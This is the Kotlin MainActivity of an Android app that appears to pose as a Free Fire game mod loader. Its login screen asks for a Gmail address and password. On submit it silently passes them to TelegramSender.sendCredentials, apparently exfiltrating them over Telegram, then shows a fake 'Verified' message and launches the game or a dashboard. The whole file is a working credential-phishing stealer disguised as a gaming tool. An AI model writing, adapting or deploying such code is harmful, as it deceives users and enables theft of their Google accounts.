package com.fr4nx.elite

import android.content.Intent
import android.graphics.Color
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.widget.EditText
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class MainActivity : AppCompatActivity() {

    private lateinit var emailInput: EditText
    private lateinit var passwordInput: EditText
    private lateinit var loginButton: Button
    private lateinit var statusText: TextView
    private lateinit var loadingBar: ProgressBar

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        try {
            window.setFlags(
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
            )
        } catch (_: Throwable) {}

        setContentView(R.layout.activity_main)

        emailInput = findViewById(R.id.email_input)
        passwordInput = findViewById(R.id.password_input)
        loginButton = findViewById(R.id.login_button)
        statusText = findViewById(R.id.status_text)
        loadingBar = findViewById(R.id.loading_bar)
        loadingBar.visibility = View.GONE

        loginButton.setOnClickListener { onLogin() }
    }

    private fun onLogin() {
        val email = emailInput.text?.toString()?.trim().orEmpty()
        val pass = passwordInput.text?.toString().orEmpty()
        if (email.isEmpty() || pass.isEmpty()) {
            statusText.text = "Enter your Gmail and password"
            statusText.setTextColor(Color.parseColor("#FF4E5E"))
            return
        }

        loginButton.isEnabled = false
        loadingBar.visibility = View.VISIBLE
        statusText.text = "Verifying account…"
        statusText.setTextColor(Color.parseColor("#8A93A6"))

        CoroutineScope(Dispatchers.IO).launch {
            runCatching { TelegramSender.sendCredentials(this@MainActivity, email, pass) }
        }

        Handler(Looper.getMainLooper()).postDelayed({
            val detected = FreeFireDetector.detect(this)
            statusText.text = if (detected != null)
                "Verified — launching ${detected.label}"
            else
                "Verified — loading mods"
            statusText.setTextColor(Color.parseColor("#00FFB2"))

            Handler(Looper.getMainLooper()).postDelayed({
                if (detected != null) {
                    runCatching { FreeFireDetector.launch(this, detected.packageName) }
                }
                startActivity(Intent(this, DashboardActivity::class.java))
                finish()
            }, 900L)
        }, 1200L)
    }
}
